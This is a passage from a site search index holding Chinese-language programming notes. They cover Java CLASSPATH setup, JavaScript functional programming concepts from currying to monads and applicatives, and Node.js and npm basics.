编译的时候，编译器为包中定义的每个类、接口等类型各创建一个不同的输出文件，输出文件的名字就是这个类型的名字，并加上 .class 作为扩展后缀。 例如：\n// 文件名: Runoob.java  package com.runoob.test; public class Runoob { } class Google { } 现在，我们用-d选项来编译这个文件，如下：\n$ javac -d . Runoob.java 这样会像下面这样放置编译了的文件：\n.\\com\\runoob\\test\\Runoob.class .\\com\\runoob\\test\\Google.class 编译之后的 .class 文件应该和 .java 源文件一样，它们放置的目录应该跟包的名字对应起来。但是，并不要求 .class 文件的路径跟相应的 .java 的路径一样。你可以分开来安排源码和类的目录。\n\u0026lt;path-one\u0026gt;\\sources\\com\\runoob\\test\\Runoob.java \u0026lt;path-two\u0026gt;\\classes\\com\\runoob\\test\\Google.class 这样，你可以将你的类目录分享给其他的编程人员，而不用透露自己的源码。用这种方法管理源码和类文件可以让编译器和 java 虚拟机（JVM）可以找到你程序中使用的所有类型。\n类目录的绝对路径叫做 class path。设置在系统变量 CLASSPATH 中。编译器和 java 虚拟机通过将 package 名字加到 class path 后来构造 .class 文件的路径。\n\u0026lt;path- two\u0026gt;\\classes 是 class path，package 名字是 com.runoob.test，而编译器和 JVM 会在 \u0026lt;path-two\u0026gt;\\classes\\com\\runoob\\test 中找 .class 文件。\n一个 class path 可能会包含好几个路径，多路径应该用分隔符分开。默认情况下，编译器和 JVM 查找当前目录。JAR 文件按包含 Java 平台相关的类，所以他们的目录默认放在了 class path 中。\n设置 CLASSPATH #  用下面的命令显示当前的 CLASSPATH 变量：\n  Windows 平台（DOS 命令行下）\n\u0026gt; set CLASSPATH   UNIX 平台（Bourne shell 下）\n$ echo $CLASSPATH   删除当前 CLASSPATH 变量内容：\n  Windows 平台（DOS 命令行下）\n\u0026gt; set CLASSPATH=   UNIX 平台（Bourne shell 下）：\n$ unset CLASSPATH; export CLASSPATH   设置 CLASSPATH 变量：\n  Windows 平台（DOS 命令行下）：\n\u0026gt; set CLASSPATH=C:\\users\\jack\\java\\classes   UNIX 平台（Bourne shell 下）：\n$ CLASSPATH=/home/jack/java/classes; export CLASSPATH   "},{"id":316,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/functional/1.basic/","title":"1. Basic","section":"functional","content":"函数式编程入门 #  纯函数 #  什么是纯函数？\n 纯函数：相同的输入，永远会得到相同的输出，而且没有任何可观察的副作用。  为什么要追求纯函数？\n 可缓存性（Cacheable）：JavaScript 中应用最广泛的库为 memoizee； 可移植性（Portable）：可移植性可以意味着把函数序列化。与之相对的是面向对象语言，移植一个对象通常需要将整个庞大的体系迁移，这也是 JavaScript 拥有强大的组件化生态的原因。 自文档化（Self-Documenting）：不需要过多的 Context 来描述函数执行前、执行后的效果； 可测试性（Testable）：Quickcheck，一个为函数式环境量身定制的测试工具。 引用透明性（Referential Transparency）：如果一个函数调用可以完全用它的返回值代替，那么称这个函数时引用透明的。  柯里化 (Curry) #  Curry 的概念：\n 只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数。  柯里化函数的简单实现：\nvar curry = fn =\u0026gt; function $curry(...args) { return (args.length \u0026lt; fn.length) ? $curry.bind(null, ...args) : fn.call(null, ...args); } 函数组合 (Compose) #  以下的操作称作为两个函数 f、g 的组合（相当于数学中的复合函数）：\nvar compose = (f,g) =\u0026gt; ( (x) =\u0026gt; f(g(x)) ); JavaScript 中有一个为了函数式编程设计的库就聚合了 compose、curry 等函数：ramda\n有一个与组合理念相关的一种设计模式，叫 Pointfree：\n Pointfree：或称隐形编程，是一种只关心函数实现而并不关心具体参数的设计模式，在实际开发过程中通常不需要把函数的参数显式地表现出来，所以代码通常看起来会更加简洁； 下面是一个用 Pointfree 设计模式优化代码的例子：  // 通常思维的代码 var snakeCase = word =\u0026gt; word.toLowerCase().replace(/\\s+/ig, \u0026#39;_\u0026#39;); // Pointfree 方式编写的代码 var snakeCase = compose(replace(/\\s+/ig, \u0026#39;_\u0026#39;), toLowerCase);  可以看到用 Pointfree 的设计模式优化之后，word 这个参数就不需要在函数定义时显式声明出来了；  PostScript：\n 小技巧：compose 函数的阅读有点类似于矩阵的乘法，如果想知道返回函数的签名，只需要知道第一个函数的参数和最后一个函数的返回值即可。  范畴论 (Category Theory) #  数学上有一个分支‘范畴论“通过研究一系列抽象的概念形式化地统一了集合论、类型论、群论等不同的分支。\n范畴论中定义了 category，它被定义为以下组件的抽象集合：\n A collection of objects：对象的集合。比如 Boolean 类型可以理解为 true/false 的集合； A collection of morphism：映射的集合。比如我们在上面提到的纯函数，就是我们主要研究的映射； A notion of composition on the morphism：映射的组合。就是我们在前面提到的 compose 操作； A distinguished morphism called identity：一个特殊的映射，恒等映射。在组合关系中恒等映射即为函数 id = x =\u0026gt; x。  Hindley-Milner 类型系统 #  什么是类型：\n 函数签名在这个类型系统中可以被认为是“类型到类型的映射”。 基于这个逻辑，“类型”在“类型系统”中可以被认为是一个变量。TypeScript 基于这个逻辑通过“泛型”设计了一个图灵完全系统。  Parametricity：\n Parametricity 是一种参数多态化函数，统一都满足的抽象性质。它指明了无论多态化参数实例化为那种真实函数，这些函数都有同样的表现形式； 比如说有这样的函数签名 [a] =\u0026gt; a，因为 a 是任意的类型，所以这个函数只能在明确的类型 Array 上进行一些操作（比如取它的第一个、最后一个、或随机的一个元素）。  Free Theorem（自由定理，见论文）：\n 因为参数多态化函数有上面的 Parametricity 性质，可以推导出函数许多相关的性质。 比如下面就是自由定理推导出的一些结果：  compose(f, head) === compose(head, map(f)); compose(map(f), filter(compose(p ,f))) === compose(filter(p), map(f));  这些看起来纯理论毫无价值的公式，实际上是有应用价值的。比如说上面的第一个公式理论上证明它们的计算结果是一样的，但是后者的计算量却比前者要大很多。  Constraints：\n 类型系统可以声明类型映射的参数满足一定的约束。这一理论化的内容在 TypeScript 中是通过 extends 关键字实现的。  "},{"id":317,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/functional/2.container/","title":"2. Container","section":"functional","content":"容器 #  通过一些基础的函数式编程操作，我们得以更优雅地进行编程，但是之前使用的纯函数编程方法却并不能解决所有的问题。比如：控制流、异常处理、异步操作、状态变化等。这些问题都可以用本节抽象的概念解决。\nContainer #  通过如下方式定义的对象称为一个简单的容器：\nclass Container { constructor(x) { this.$value = x; } static of (x) { return new this.constructor(x); } } 其中 static 函数 of 仅仅是为了方便代码更加函数化而定义，不影响理论探究的函数。\n具体的，容器的操作应该遵循以下的约定：\n Container 是一个有且仅有一个属性的对象，我们后面将抽象地将它命名为 $value； $value 不能被约束为任何特定的类型，否则我们的使用场景将相当有限； $value 一旦进入容器，它将一只被设置在容器内。我们可以但不应当通过 .$value 这种访问属性的方式访问他。  Functor (Identity) #  Functor 是一类特殊的 Container，我们后续讨论的容器都是基于 Functor 的。它的简单实现：\nclass Functor extends Container { map(f) { return Functor.of( f(this.$value) ); } } 所以 Functor 是：一种实现了 map 方法的容器。\n有了 Functor，我们就可以像函数式编程一样处理有状态的问题，比如：\nFunctor.of(\u0026#39;bombs\u0026#39;).map( append(\u0026#39; away\u0026#39;) ).map( prop(\u0026#39;length\u0026#39;) ); // Functor.$value === 10 Functor 在 Container 中就像我们之前在 compose 中提到的恒等函数 id 一样平凡，所以通常也被称为 Identity。\nMaybe #  上面的工作是简单平凡的，如果我们在 Container 中实现更多的方法，就可以拥有更丰富的功能。\nMaybe 是一种用 Functor 实现空值检测的容器：\nclass Maybe extends Functor { get isNothing() { return this.$value === null || this.$value === undefined; } map(fn) { return this.isNothing ? this : Maybe.of( fn(this.$value) ); } inspect() { return this.isNothing ? \u0026#39;Nothing\u0026#39; : `Just(${inspect(this.$value)})`; } } 通常情况下，我们强制要求每次调用都需要以 Maybe 作为返回值，但是如果我们非要用一个非 Maybe 的函数作为返回值，可以借助下面这种方式：\n// maybe :: b -\u0026gt; (a -\u0026gt; b) -\u0026gt; Maybe a -\u0026gt; b var maybe = curry(function(x, f, m) { return m.isNothing() ? x : f(m.$value); }); // 返回值是 string, 而非 Maybe var getTwenty = compose( maybe(\u0026#34;You\u0026#39;re broke!\u0026#34;, finishTransaction), withdraw(20) ); Either #  Either 也是一类特殊的 Functor，它的本意是指返回值可以是一个 SumType。\n这种 Fucntor 可以被用于进行错误处理，不同于 throw/catch，使用这种方式进行错误处理更加温和，我们可以定义一个左值作为发生异常时的类型（比如一个承载错误信息的字符串，类型为 String），右值作为执行成功时的真正结果。\nclass Either extends Functor { static of(x) { return new Right(x); } } class Left extends Either { map(fn) { return this; } } class Right extends Either { map(fn) { try { return Eitherr.of( fn(this.$value) ); } catch (e) { return new Left(e); } } } IO #  在基础部分提到进行函数编程的前提是需要纯函数，但是某些函数的执行结果由于依赖于外部的环境，所以相同的输入通常会得到不同的结果，我们可以这个函数原子化并以其本身作为返回值，构造一个二级函数，这个二级函数显然是一个纯函数。\n以这个思想构造的容器称为 IO，即 $value 为函数的 Functor：\nclass IO extends Functor { static of(x) { return new IO(() =\u0026gt; x); } constructor(fn) { this.$value = fn; } map(fn) { return new IO(compose(fn, this.$value)); } inspect() { return `IO(${inspect(this.$value)})`; } } 在系列函数执行之后，函数的 $value 本质是一个函数，我们还需要在最后执行它。但是这一直接访问 $value 的操作在我们的容器设计中总是不安全的，所以我们重命名为 unsafePerformIO 以指示这一区别。下面是一个应用 IO 的例子：\nconst url = new IO(() =\u0026gt; window.location.href); const toPairs: string =\u0026gt; string[][] = compose(map(split(\u0026#39;=\u0026#39;)), split(\u0026#39;\u0026amp;\u0026#39;)); const params: string =\u0026gt; string[][] = compose(toPairs, last, split(\u0026#39;?\u0026#39;)); const findParam: string =\u0026gt; IO\u0026lt;Maybe\u0026lt;string[]\u0026gt;\u0026gt; = key =\u0026gt; url.map( compose(Maybe.of, find(compose(eq(key), head)), params) ); // impure code findParam(\u0026#39;searchTerm\u0026#39;).unsafePerformIO(); PostScript：\n map 函数的理解：第一个参数是映射函数，第二个参数是定义域，返回值则是值域。 虽然我们现在定义的这些函数都是成员函数，但是之后它们可能会经常以独立函数的身份出现，它们通常被定义为“接受一个对应 Functor 类型并且执行对应成员函数”的函数，由于这个规定是为了优化 compose 函数的编写，因此容器类型的参数通常是最后一个参数。比如：map = curry( (fn, m) =\u0026gt; m.map(fn) );  Task #  最后异步类型的任务可以用一个叫 Task 的容器处理，这个容器的具体实现过程过于复杂，下面仅仅列举它的一个使用的例子：\nvar getJSON: string =\u0026gt; object =\u0026gt; Task\u0026lt;Error, object\u0026gt; = curry( (url, params) =\u0026gt; new Task((reject, result) =\u0026gt; { $.getJSON(url, params, result).fail(reject); }) ); var blogPage: object =\u0026gt; HTML = Handlebars.compile(blogTemplate); var renderPage: object =\u0026gt; HTML = compose(blogPage, sortBy(\u0026#39;date\u0026#39;)); var blog: object =\u0026gt; Task\u0026lt;Error, object\u0026gt; = compose(map(renderPage), getJSON(\u0026#39;/posts\u0026#39;)); 实际函数在执行时，则需要调用 fork 函数进行异步地执行：\nblog({}).fork( error =\u0026gt; $(\u0026#39;#error\u0026#39;).html(error.message), page =\u0026gt; $(\u0026#39;#main\u0026#39;).html(page), ); 范畴学理论 #  上面提到的这些 Container 都被称为 Functor，而 Functor 本身是可以构成一个范畴学意义上的 category 的：\n 恒等映射：map(id) === id； 组合律：compose(map(f), map(g)) === map(compose(f, g))；  "},{"id":318,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/functional/3.monad/","title":"3. Monad","section":"functional","content":"Monad #  Pointy Functor Factory #  在前面有关 Functor 的论述中使用了 of 函数，实际上这个函数并不是用来替换 new 这个操作符的：\n Pointed Functor：一种实现了 of 方法的 Functor。  of 方法在很多地方以不同的名称出现，但是它们都是相同的意思，比如 pure, point, unit 或 return。\nJavaScript 语言中有许多类型功能的库：folktale、ramda 或 fantasy-land。\nWhat\u0026rsquo;s Monad? #  先看一个通过 Container 方法从 Json 中获取给定字段的例子：\nconst safeProp: string =\u0026gt; object =\u0026gt; Mabey\u0026lt;any\u0026gt; = curry((x, obj) =\u0026gt; Maybe.of(obj[x])); const safeHead: object =\u0026gt; Maybe\u0026lt;any\u0026gt; = safeProp(0); const firstAddressStreet: object =\u0026gt; Maybe\u0026lt;Maybe\u0026lt;Maybe\u0026lt;any\u0026gt;\u0026gt;\u0026gt; = compose( map(map(safeProp(\u0026#39;street\u0026#39;))), map(safeHead), safeProp(\u0026#39;addresses\u0026#39;), ); firstAddressStreet({ addresses: [{ street: { name: \u0026#39;Mulburry\u0026#39;, number: 8402 }, postcode: \u0026#39;WC2N\u0026#39; }], }); 可以看到在处理真实场景时，map 会像上面的情况一样出现多层嵌套的情况。我们可以用 join 函数解决上面的问题：\n join 是用于缩减相同类型返回值出现嵌套情况的函数。实现了 join 方法的 pointed functor 被称为 monad；  以下是 Maybe 实现 join 方法的例子：\nMaybe.prototype.join = function join() { return this.isNothing() ? Maybe.of(null) : this.$value; }; 我们可以用 join 优化上面的例子：\nconst firstAddressStreet = compose( join,\t// Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  map(safeProp(\u0026#39;street\u0026#39;)),// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt;  join,\t// Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  map(safeHead),\t// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt;  safeProp(\u0026#39;addresses\u0026#39;), // object =\u0026gt; Maybe\u0026lt;object\u0026gt; ); firstAddressStreet({ addresses: [{ street: { name: \u0026#39;Mulburry\u0026#39;, number: 8402 }, postcode: \u0026#39;WC2N\u0026#39; }], }); chain #  在上面引入 join 对原来的程序进行了优化之后，虽然解决了嵌套调用和返回多层 Functor 的问题，但是调用链却似乎更长了。\n我们发现 join 函数与 map 函数总是连续地出现，我们可以把这个抽象成一个新的函数 chain（或者在某些语境下的其他名称，但是它们都表示相同的意思，比如 \u0026gt;\u0026gt;=、flatMap）：\nconst chain = curry((f, m) =\u0026gt; m.map(f).join()); // or const chain = function \u0026lt;Farg, Fret\u0026gt;(f: Farg =\u0026gt; Monad\u0026lt;Fret\u0026gt;): (Monad\u0026lt;Farg\u0026gt; =\u0026gt; Monad\u0026lt;Fret\u0026gt;) { return compose(join, map(f)); } 同样的我们可以用 chain 来优化上面的例子：\nconst firstAddressStreet = compose( chain(safeProp(\u0026#39;street\u0026#39;)),// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  chain(safeHead),\t// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  safeProp(\u0026#39;addresses\u0026#39;),\t// object =\u0026gt; Maybe\u0026lt;object\u0026gt; ); 有了强大的 chain，我们：\n 可以并不增加成本地像用 map 处理纯函数那样，用 chain 处理有副作用的函数； 甚至可以把 join 定义为 chain(id)，所有这些概念的定义都是相互联系的（Js 中有关这些概念的推导都列在了 fantacyland 中）；  下面是一个用 chain 处理副作用函数的例子：\nquerySelector(\u0026#39;input.username\u0026#39;).chain( ({ value: uname }) =\u0026gt; querySelector(\u0026#39;input.email\u0026#39;).map( ({ value: email }) =\u0026gt; `Welcome ${uname}prepare for spam at ${email}` ) ); Power Trip #  有了上面定义的这些方法我们就可以优化分支极多的错误处理函数了。比如最常见的读取文件后发送网络请求：\n// upload :: Filename -\u0026gt; (String -\u0026gt; a) -\u0026gt; Void const upload = (filename, callback) =\u0026gt; { if (!filename) { throw new Error(\u0026#39;You need a filename!\u0026#39;); } else { readFile(filename, (errF, contents) =\u0026gt; { if (errF) throw errF; httpPost(\u0026#39;/uploads\u0026#39;, contents, (errH, json) =\u0026gt; { if (errH) throw errH; callback(json); }); }); } }; 可以用下面的一行函数优化：\nconst upload = compose(map(chain(httpPost(\u0026#39;/uploads\u0026#39;))), readFile); 范畴学理论 #  由 Monad 构成的运算规则也可以被定义为 category：\n 集合基本元素为签名为 T =\u0026gt; Monad\u0026lt;T\u0026gt; 的所有映射 。态射即所有基本元素内的映射 考虑 chain，定义二元运算：mcompose = (f, g) =\u0026gt; compose(chain(f), g)  单位元：id = (monad) =\u0026gt; Monad.of(monad)； 组合律：mcompose(mcompose(f, g), h) === mcompose(f, mcompose(g, h))；    上面这个 category 在范畴论里来源于一个特殊的范畴 \u0026ldquo;Kleisli category\u0026rdquo;；\n"},{"id":319,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/functional/4.applicative/","title":"4. Applicative","section":"functional","content":"Applicative #  Brief Introduction #  Applicative 指的是这样的一个性质：functor 之间可以相互 apply。\n看下面这样一个例子：\nContainer.of(2).chain(two =\u0026gt; Container.of(3).map(add(two))); 上面是一个用 Monad 实现 2+3 的例子，可以看到我们需要构造 Container.of(3) 然后构造一个加法函数，最后构造一个 Container.of(2) 进行应用。\n我们发现 Container.of(3)/Container.of(2) 具有先后的构造关系，这是没有必要的，如果我们能同时构造两个 Functor 并且其中一个应用到另一个上，那么我们就完美解决了这个问题，这个性质就叫做 Applicative。\nap #  在 applicative 这个概念里的核心函数是 ap。它的实现如下：\n// 类型签名 type apSig\u0026lt;Farg, Fret\u0026gt; = (Container\u0026lt;Farg\u0026gt;, Container\u0026lt;Farg =\u0026gt; Fret\u0026gt;) =\u0026gt; Container\u0026lt;Fret\u0026gt;; // 函数实现 Container.prototype.ap = function (otherContainer) { return otherContainer.map(this.$value); } ap 函数的实现即 Applicative Functor 的定义：\n 实现了 ap 函数的 Pointed Functor 即为 Applicative Functor；  可以用 ap 优化上面的例子：\nContainer.of(3).map(add(2)) // optimize to =\u0026gt; Container.of(add(2)).ap(Container.of(3)); Container.of(2).chain(two =\u0026gt; Container.of(3).map(add(two))); // map(compose(f, g)) === compose(map(f), map(g)) //\tcompose(map(f), of) === compose(of, f) // optimize to =\u0026gt; Container.of(2).map(add).ap(Container.of(3)); 上面的优化使用了 ap 的一个恒等性质：\nF.of(x).map(f) === F.of(f).ap(F.of(x)) 利用这个性质我们甚至可以把代码写成更容易读懂的从左到右的写法：\nContainer.of(add).ap(Maybe.of(2)).ap(Maybe.of(3)); 将这个理念应用到 Task 上，可以同步地执行两个不同的异步任务：\nTask.of(renderPage).ap(Http.get(\u0026#39;/destinations\u0026#39;)).ap(Http.get(\u0026#39;/events\u0026#39;)); lift #  上面提到 ap 这个函数可以在函数式编程中实现与常规函数一样的从左向右的依次调用过程，那么我们是否可以像常规多参数函数一样传递参数呢。\n这个理念可以用 lift 这个函数实现：\nconst liftA3 = curry((g, f1, f2, f3) =\u0026gt; f1.map(g).ap(f2).ap(f3)); Category Thory #  本节中提及的 ap 可以构成范畴论中的 category：\n 定义二元运算：b = (l, r) =\u0026gt; l.ap(r)；  单位元 id = Functor.of(x =\u0026gt; x)，b(id, any) === any    "},{"id":320,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/html5/html-css%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"HTML Css自学笔记","section":"html5","content":"自学笔记 (pdf) #  \r"},{"id":321,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/html5/javascript%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"Java Script自学笔记","section":"html5","content":"自学笔记 (pdf) #  \r"},{"id":322,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/1.%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90/","title":"1.简单的例子","section":"nodejs","content":" 参考：\n https://www.runoob.com/nodejs/nodejs-http-server.html   第一个程序 #  HelloWorld #  在 Mac 上直接使用下面的命令即可安装：\nbrew install node HelloWorld 程序，可以检测安装状态：\nconsole.log(\u0026#34;Hello World\u0026#34;); 简单的 WEB 服务器 #  在我们创建 Node.js 第一个 \u0026ldquo;Hello, World!\u0026rdquo; 应用前，让我们先了解下 Node.js 应用是由哪几部分组成的：\n **引入 required 模块：**我们可以使用 require 指令来载入 Node.js 模块。 **创建服务器：**服务器可以监听客户端的请求，类似于 Apache 、Nginx 等 HTTP 服务器。 **接收请求与响应请求：**服务器很容易创建，客户端可以使用浏览器或终端发送 HTTP 请求，服务器接收请求后返回响应数据。  代码如下：\nvar http = require(\u0026#39;http\u0026#39;); http.createServer(function (request, response) { // 发送 HTTP 头部  // HTTP 状态值: 200 : OK  // 内容类型: text/plain  response.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;}); // 发送响应数据 \u0026#34;Hello World\u0026#34;  response.end(\u0026#39;Hello World\\n\u0026#39;); }).listen(8888); // 终端打印如下信息 console.log(\u0026#39;Server running at http://127.0.0.1:8888/\u0026#39;); "},{"id":323,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/10.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB/","title":"10.函数与类","section":"nodejs","content":"函数与类 #  prototype #  简单地说，JavaScript 是基于原型的语言。\n当我们调用一个对象的属性时，如果对象没有该属性，JavaScript 解释器就会从对象的原型对象上去找该属性，如果原型上也没有该属性，那就去找原型的原型，直到最后返回 null 为止，null没有原型。这种属性查找的方式被称为原型链（prototype chain）。\nnew #  当 js 语言执行 new 操作时具体时执行的什么操作呢？\n  创建一个空对象 u = {}\n  绑定原型，u.__proto__ = User.prototype 或 Objet.setPrototypeOf(u, User.prototype)；\n  调用 User() 函数，并把空对象 u 当做 this 传入，即 User.call(u)；\n  如果 User() 函数执行完自己 return 一个 object 类型，那么返回此变量，否则返回 this。\nPS：如果构造函数返回基本类型值，则不影响，还是返回 this\n  箭头函数与普通函数 #  区别：\n 箭头函数不会创建自己的 this：它会从自己的作用域链上继承一个 this； 箭头函数的 this 永远不变：它的 this 在被定义时就已经确定了（call/apply/bind 都无法改变箭头函数的指向）； 箭头函数不能作为构造函数使用（本质是因为 this 无法改变）； 箭头函数没有自己的 argument，没有 prototype； 箭头函数不能使用 yeild 关键字；  "},{"id":324,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/2.npm%E4%BB%8B%E7%BB%8D/","title":"2. Npm介绍","section":"nodejs","content":" 参考：\n https://www.runoob.com/nodejs/nodejs-npm.html   NPM #  介绍 #  NPM 是随同 node.js 一起安装的包管理工具，能解决 node.js 代码部署上的很多问题。\n常见的使用场景有以下几种：\n 允许用户从 NPM 服务器下载，别人编写的第三方包到本地使用。 允许用户从 NPM 服务器下载并安装，别人编写的命令行程序到本地使用。 允许用户将自己编写的包或命令行程序，上传到 NPM 服务器供别人使用。  通过查看版本信息，检测是否安装：\nnpm -v 如果你安装的是旧版本的 npm，可以很容易得通过 npm 命令来升级，命令如下：\nsudo npm install npm -g 命令行使用方式 #  本地安装 #  以 express 为例，安装方式为：\nnpm install express 这种安装方式：\n 将安装包放在 ./node_modules 下（运行 npm 命令时所在的目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。 可以通过 require() 来引入本地安装的包。  全局安装 #  以 express 为例，安装方式为：\nnpm install express -g 这种安装方式：\n 将安装包放在 /usr/local 下或者你 node 的安装目录。 可以直接在命令行里使用。  链接 #  npm link 用来在本地项目和本地 npm 模块之间建立连接，可以在本地进行模块测试：\n  项目和模块在同一个目录下，可以使用相对路径\nnpm link ../module   项目和模块不在同一个目录下：\ncd module \u0026amp;\u0026amp; npm link # 进行全局link cd project \u0026amp;\u0026amp; npm link \u0026lt;Module Name\u0026gt; # 模块名指 package.json 中的 name   解除 link：\n# 解除项目和模块 link cd project \u0026amp;\u0026amp; npm unlink \u0026lt;Module Name\u0026gt; # 解除模块全局 link cd module \u0026amp;\u0026amp; npm unlink \u0026lt;Module Name\u0026gt;   如果你希望兼具本地安装、全局安装的功能，则需要在两个地方安装它或使用 npm link。\n查看安装信息 #  你可以用以下的命令查看所有全局安装的模块：\nnpm list -g 如果要查看某个模块的版本号，可以使用命令如下：\nnpm list \u0026lt;Module Name\u0026gt; 卸载模块 #  我们可以使用以下命令来卸载 Node.js 模块。\nnpm uninstall express 卸载后，你可以到 /node_modules/ 目录下查看包是否还存在，或者使用以下命令查看：\nnpm ls 更新模块 #  我们可以使用以下命令更新模块：\nnpm update express 把当前目录下 node_modules 子目录里边的对应模块更新至最新版本：\nnpm update 把全局安装的对应命令行程序更新至最新版：\nnpm update -g 创建模块 #  创建模块，package.json 文件是必不可少的。\n我们可以使用 NPM 生成 package.json 文件，生成的文件包含了基本的结果。\nnpm init 以上的命令会要求输入信息，需要根据个人的情况输入。在最后输入 \u0026ldquo;yes\u0026rdquo; 后会生成 package.json 文件。\n接下来我们可以使用以下命令在 npm 资源库中注册用户（使用邮箱注册）：\nnpm adduser 接下来我们就用以下命令来发布模块：\nnpm publish 其他常用命令 #  除了本章介绍的部分外，NPM还提供了很多功能，package.json 里也有很多其它有用的字段。详细可以参考官方文档：npmjs.org/doc/。\n这里再介绍一些NPM常用命令。\n  使用 查看某条命令的详细帮助，例如 install\nnpm help install   在 package.json 所在目录下使用：\nnpm install . -g  可先在本地安装当前命令行程序，可用于发布前的本地测试。   清空 NPM 本地缓存，用于对付使用相同版本号发布新版本代码的人：\nnpm cache clear    撤销发布自己发布过的某个版本代码：\nnpm unpublish @   使用以下来搜索模块：\n  npm search express 补充 #  版本号 #  使用NPM下载和发布代码时都会接触到版本号。NPM使用语义版本号来管理代码，这里简单介绍一下。\n语义版本号分为 X.Y.Z 三位，分别代表主版本号、次版本号和补丁版本号。\n当代码变更时，版本号按以下原则更新：\n 如果只是修复 bug，需要更新 Z 位。 如果是新增了功能，但是向下兼容，需要更新 Y 位。 如果有大变动，向下不兼容，需要更新 X 位。  版本号有了这个保证后，在申明第三方包依赖时，除了可依赖于一个固定版本号外，还可依赖于某个范围的版本号。\n使用淘宝 NPM 镜像 #  大家都知道国内直接使用 npm 的官方镜像是非常慢的，这里推荐使用淘宝 NPM 镜像。\n淘宝 NPM 镜像是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步。\n你可以使用淘宝定制的 cnpm (gzip 压缩支持) 命令行工具代替默认的 npm:\nnpm install -g cnpm --registry=https://registry.npm.taobao.org 这样就可以使用 cnpm 命令来安装模块了：\ncnpm install [name] 更多信息可以查阅：http://npm.taobao.org/。\n"},{"id":325,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/3.repl/","title":"3. Repl","section":"nodejs","content":"Node.js REPL #  介绍 #  Node.js REPL (Read Eval Print Loop: 交互式解释器) 表示一个电脑的环境，类似 Window 系统的终端或 Unix/Linux shell，我们可以在终端中输入命令，并接收系统的响应。\nNode 自带了交互式解释器，可以执行以下任务：\n 读取 Read：读取用户输入，解析输入了Javascript 数据结构并存储在内存中。 执行 Eval：执行输入的数据结构 打印 Print：输出结果 循环 Loop：循环操作以上步骤直到用户两次按下 ctrl-c 按钮退出。  Node 的交互式解释器可以很好的调试 Javascript 代码。\n学习 REPL #  我们可以输入以下命令来启动 Node 的终端：\nnode 这个终端内的运行效果跟 chrome 中的 console 中差异不大。\n除了数值计算、函数、逻辑控制这些其他语言都具备的功能之外，以下特性值得学习：\n 下划线(_)变量：你可以使用下划线 _ 获取上一个表达式的运算结果： ctrl + c：退出当前终端。 ctrl + c 按下两次 / ctrl + d：退出 Node REPL。 :arrow_up:/:arrow_down:：查看输入的历史命令 tab 键：列出当前命令 .help：列出使用命令 .break / .clear：退出多行表达式 .save \u0026lt;filename\u0026gt;：保存当前的 Node REPL 会话到指定文件 .load \u0026lt;filename\u0026gt;：载入当前 Node REPL 会话的文件内容。  "},{"id":326,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/4.%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/","title":"4.回调函数","section":"nodejs","content":"回调函数 #  介绍 #  Node.js 异步编程的直接体现就是回调。\n异步编程依托于回调来实现，但不能说使用了回调后程序就异步化了。\n回调函数在完成任务后就会被调用，Node 使用了大量的回调函数，Node 所有 API 都支持回调函数。\n回调函数一般作为函数的最后一个参数出现：\nfunction foo1(name, age, callback) { } function foo2(value, callback1, callback2) { } 阻塞代码（同步）实例 #  创建一个文件 test.txt ，内容如下：\nlaji shesl\u0026#39;s test case 创建 mainsync.js 文件, 代码如下：\nvar fs = require(\u0026#34;fs\u0026#34;); var data = fs.readFileSync(\u0026#39;test.txt\u0026#39;); console.log(data.toString()); console.log(\u0026#34;done!\u0026#34;); 以上代码执行结果如下：\n$ node mainsync.js laji shesl's test case Done!! 非阻塞代码（异步）实例 #  创建一个文件 testasync.txt ，内容如下：\nlaji shesl's test case 创建 mainasync.js 文件, 代码如下：\nvar fs = require(\u0026#34;fs\u0026#34;); fs.readFile(\u0026#39;test.txt\u0026#39;, function (err, data) { if (err) return console.error(err); console.log(data.toString()); }); console.log(\u0026#34;Done!!\u0026#34;); 以上代码执行结果如下：\n$ node mainasync.js Done!! laji shesl's test case "},{"id":327,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/nodejs/5.%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/","title":"5.事件循环","section":"nodejs","content":" 参考：\n  https://www.runoob.com/nodejs/nodejs-event-loop.html\n  https://zhuanlan.zhihu.com/p/37427130\n   事件循环 #  简介 #  Node.js 